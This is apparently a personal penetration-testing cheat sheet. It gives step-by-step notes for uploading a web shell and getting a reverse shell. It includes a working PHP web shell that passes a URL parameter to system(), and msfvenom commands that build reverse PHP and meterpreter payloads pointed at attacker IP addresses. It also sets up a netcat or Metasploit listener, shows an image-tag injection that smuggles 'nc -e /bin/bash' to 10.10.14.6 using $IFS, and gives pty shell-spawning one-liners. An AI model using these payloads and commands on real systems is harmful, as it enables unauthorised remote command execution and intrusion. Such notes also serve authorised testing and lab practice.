#### Shell

First see if we can uplaod any file to the server.

- asp shell to windows server.
- jsp shell on apache topgate
- php shell on classic apache server.

`https://rosettacode.org/wiki/Execute_a_system_command`
`pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet`
Note: Need to run nc listener in the sysem to run the shell.

Simple shell code example shell.php:

```php
<html>
<?php

echo "<form method=GET><input type=text name=cmd><input type=submit value=ok></$=ok></form>";
system($_GET["cmd"]);

?>
</html>
```

Shells code are available in internet.
* * *

#### msfvenom
`msfvenom --list payloads | grep php | grep reverse` use this for seaching.

`msfvenom -p php/reverse_php lhost=192.168.0.58 lport=443 -o r443.php` 
or
`msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=172.16.64.2 lport=59919 -f elf -o meter`

Then move r443.php to webserver and visit the webpage.
Before that `nc -lvp 443`
And request the r443.php from the webserver.

We can also use metasploit listener.
`use exploit/multi/handler`
`set payload php/reverse_php` -same as before.
`set lhost=192.168.0.58`
`set lport=443`
`run`
To upgrade to meterpreter shell:
switch the session to background.
`use post/multi/manage/shell_to_meterpreter`
set the options.

* * *

`<img src=http://10.10.14.6/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.6'$IFS'1234')>` and do ncat listener to get reverse shell.


spawning: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
`execute -f /bin/sh -i -c`